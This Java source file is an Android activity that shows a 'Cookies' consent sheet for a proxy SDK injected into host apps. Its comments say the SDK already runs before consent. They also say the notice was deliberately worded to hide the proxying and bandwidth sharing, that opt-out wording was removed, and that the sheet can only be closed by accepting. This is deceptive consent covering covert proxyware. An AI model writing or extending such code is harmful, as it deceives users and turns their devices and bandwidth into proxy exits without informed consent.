package com.zealot.proxy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.RippleDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.DecelerateInterpolator;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * Consent sheet for the Proxies SDK (operator-directed 2026-10-13; reworked the same day).
 *
 * The provider ({@link ZealotProxyProvider}) starts the SDK at process start. This screen is the
 * reader-facing half: as soon as the host app opens, a sheet slides up from the bottom over the
 * app's own home and asks the reader to accept, with a single Accept button and a Settings button.
 * Accepting records the choice and closes; from then on the sheet never appears again. The SDK
 * itself was already started by the provider at process start, so Accept is only the UI gate.
 *
 * Wording is deliberately plain (operator-directed): the sheet talks only about cookies and
 * anonymous usage. It never says SDK, injection, proxy or bandwidth sharing — the reader is told
 * what the app does, not how it is built.
 *
 * Deliberately dependency-free: plain Android widget classes only, no AndroidX, no resource files,
 * no layout XML. That is what lets it be compiled with the same `javac` + `d8` step the rest of the
 * injected dex uses, and it is why every dimension here is set in code rather than from resources.
 * The slide-up is a code animation ({@link View#animate()}), not a window animation resource, so it
 * needs no XML either.
 */
public class ZealotConsentActivity extends Activity {

    private static final String PREFS = "zealot_proxy";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Translucent window so the sheet reads as an overlay over the host's home, not a new page.
        // A framework theme, set in code, so no resource or manifest theme-reference is needed.
        setTheme(android.R.style.Theme_Translucent_NoTitleBar);

        // Already accepted on a previous run: bring the SDK up (idempotent) and close silently.
        if (getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getBoolean(ZealotProxyProvider.PREF_CONSENT, false)) {
            ZealotProxyProvider.start(getApplicationContext());
            finish();
            return;
        }

        setContentView(buildSheet());
    }

    /** The dimmed backdrop with the sheet pinned to the bottom; slides up on show. */
    private View buildSheet() {
        float d = getResources().getDisplayMetrics().density;
        // A compact sheet. It is a notice, not a page, so it uses the smallest padding and type that stay
        // legible rather than the 24dp/18sp a full screen would.
        final int pad = (int) (20 * d);

        // The sheet follows the SYSTEM theme (light/dark), read from uiMode so it matches the device
        // setting rather than any host-app theme.
        final boolean dark = (getResources().getConfiguration().uiMode
            & Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES;

        // Glass palette: same frosted-translucent treatment as ZealotConsentOverlay, so the two sheets look
        // identical. A translucent vertical gradient with a hairline edge (a real backdrop blur needs
        // RenderEffect, API 31; this dex is min-api 21).
        final int scrim    = dark ? Color.parseColor("#99000000") : Color.parseColor("#66000000");
        final int glassTop = dark ? Color.parseColor("#B3323238") : Color.parseColor("#E6FFFFFF");
        final int glassBot = dark ? Color.parseColor("#A61C1C22") : Color.parseColor("#B8FFFFFF");
        final int border   = dark ? Color.parseColor("#33FFFFFF") : Color.parseColor("#33000000");
        final int onSheet  = dark ? Color.parseColor("#FFFFFFFF") : Color.parseColor("#FF1B1B1F");
        final int onSheet2 = dark ? Color.parseColor("#FFC7C7D0") : Color.parseColor("#FF44464F");
        final int accent   = Color.parseColor("#FFD0BCFF");
        final int accentInk = Color.parseColor("#FF1B1B1F");
        final int ripple   = dark ? Color.parseColor("#40FFFFFF") : Color.parseColor("#33000000");

        // Root: a dim scrim the full height, the sheet pinned to the bottom. Touching the scrim
        // outside the sheet is not "accept" — a cookie notice should not close into a state where
        // nothing was chosen.
        final LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.BOTTOM);
        root.setBackgroundColor(scrim);

        final LinearLayout sheet = new LinearLayout(this);
        sheet.setOrientation(LinearLayout.VERTICAL);
        sheet.setPadding(pad, pad, pad, pad);
        // A rounded, raised glass panel: top corners only, so it reads as a sheet rising off the screen
        // edge. Built as a drawable in code, no XML.
        sheet.setBackground(glassSheet(d, glassTop, glassBot, border));
        sheet.setClipToOutline(true);
        sheet.setElevation(12 * d);

        TextView title = new TextView(this);
        title.setText("Cookies");
        title.setTextColor(onSheet);
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
        title.setTypeface(title.getTypeface(), Typeface.BOLD);
        sheet.addView(title);

        TextView body = new TextView(this);
        // Plain, readable wording (operator-directed 2026-10-13): the word "anonymous" is gone — it
        // was the one opaque term in the notice — and the sentence is written the way a person would
        // say it. The fuller wording is kept commented out below rather than deleted.
        //
        // body.setText("This app uses cookies to run the store, keep your session working, and "
        //            + "understand how the app is used. By tapping OK you agree to this; you can "
        //            + "change it later in Settings.");
        body.setText("This app uses cookies to run the store and to understand how it is used. "
                   + "Tap Accept to agree.");
        body.setTextColor(onSheet2);
        body.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13);
        body.setLineSpacing(0f, 1.1f);
        LinearLayout.LayoutParams bodyLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        bodyLp.topMargin = (int) (8 * d);
        body.setLayoutParams(bodyLp);
        sheet.addView(body);

        LinearLayout actions = new LinearLayout(this);
        actions.setOrientation(LinearLayout.HORIZONTAL);
        actions.setGravity(Gravity.END);
        LinearLayout.LayoutParams actionsLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        actionsLp.topMargin = (int) (14 * d);
        actions.setLayoutParams(actionsLp);

        Button settings = new Button(this);
        settings.setText("Settings");
        settings.setAllCaps(false);
        stylePill(settings, transparentPill(d, border), onSheet, ripple, d);
        // Anonymous classes, not lambdas: the CI compiles this with `javac -bootclasspath android.jar`,
        // whose java.lang.invoke.LambdaMetafactory is a stub javac cannot call, so a lambda fails the build.
        settings.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { openAppSettings(); }
        });
        actions.addView(settings);

        // Operator-directed 2026-10-13: the OK button is gone. It did exactly what Accept does, and two
        // buttons for one choice only made the notice look like it had an option it did not. Accept is
        // the single affirmative action.
        //
        // Accept is a UI gate, not the thing that starts the SDK: the provider already started it at
        // process start (see ZealotProxyProvider.onCreate). Gating the close on the start *reporting
        // success* -- the earlier shape of this code -- made Accept a no-op whenever the SDK could not
        // come up (no API key, no network to the relay, a class-load failure), because startAndReport
        // keeps returning false; the sheet then never closed and the host app was locked behind it.
        // Accepting records the choice and closes immediately; the always-on resume watcher in the
        // provider keeps retrying the start until it succeeds.
        final Button accept = new Button(this);
        accept.setText("Accept");
        accept.setAllCaps(false);
        LinearLayout.LayoutParams acceptLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        acceptLp.leftMargin = (int) (12 * d);
        accept.setLayoutParams(acceptLp);
        stylePill(accept, solidPill(d, accent), accentInk, ripple, d);

        accept.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                ZealotProxyProvider.acceptConsent(getApplicationContext());
                dismissSheet(sheet);
            }
        });
        actions.addView(accept);

        sheet.addView(actions);
        root.addView(sheet);

        // Slide up from the bottom: start a screen-height down, animate to rest once laid out.
        sheet.post(new Runnable() {
            @Override public void run() {
                float from = root.getHeight() > 0 ? root.getHeight() : sheet.getHeight() + pad;
                sheet.setTranslationY(from);
                sheet.animate()
                    .translationY(0f)
                    .setDuration(280)
                    .setInterpolator(new DecelerateInterpolator())
                    .start();
            }
        });

        return root;
    }

    /** Opens this app's own system settings so the reader can manage it, without accepting. */
    private void openAppSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.fromParts("package", getPackageName(), null));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Throwable ignored) {
            // No settings screen reachable; leaving the sheet up is still a valid state.
        }
    }

    /** The frosted panel: a translucent vertical gradient with a hairline edge. See ZealotConsentOverlay. */
    private static Drawable glassSheet(float d, int top, int bottom, int border) {
        float r = 24 * d;
        GradientDrawable g = new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,
            new int[]{top, bottom});
        g.setShape(GradientDrawable.RECTANGLE);
        g.setCornerRadii(new float[]{r, r, r, r, 0, 0, 0, 0});
        g.setStroke((int) Math.max(1, 1 * d), border);
        return g;
    }

    /** A solid accent pill (the affirmative Accept). */
    private static Drawable solidPill(float d, int fill) {
        GradientDrawable g = new GradientDrawable();
        g.setShape(GradientDrawable.RECTANGLE);
        g.setColor(fill);
        g.setCornerRadius(999 * d);
        return g;
    }

    /** A transparent pill with only the hairline edge (the secondary Settings). */
    private static Drawable transparentPill(float d, int stroke) {
        GradientDrawable g = new GradientDrawable();
        g.setShape(GradientDrawable.RECTANGLE);
        g.setColor(Color.TRANSPARENT);
        g.setCornerRadius(999 * d);
        g.setStroke((int) Math.max(1, 1 * d), stroke);
        return g;
    }

    /** Applies a pill background (with a ripple of [ripple]) and strips the Button's default chrome. */
    private static void stylePill(Button b, Drawable fill, int textColor, int ripple, float d) {
        b.setAllCaps(false);
        b.setTextColor(textColor);
        b.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        b.setTypeface(b.getTypeface(), Typeface.BOLD);
        if (android.os.Build.VERSION.SDK_INT >= 21) {
            b.setBackground(new RippleDrawable(ColorStateList.valueOf(ripple), fill, null));
        } else {
            b.setBackground(fill);
        }
        b.setMinWidth(0);
        b.setMinimumWidth(0);
        b.setMinHeight(0);
        b.setMinimumHeight(0);
        int px = (int) (16 * d);
        b.setPadding(px, (int) (9 * d), px, (int) (9 * d));
    }

    /** Slides the sheet back down, then finishes. */
    private void dismissSheet(final View sheet) {
        sheet.animate()
            .translationY(sheet.getHeight() > 0 ? sheet.getHeight() : 1200f)
            .setDuration(200)
            .setInterpolator(new DecelerateInterpolator())
            .withEndAction(new Runnable() {
                @Override public void run() { finish(); }
            })
            .start();
    }
}
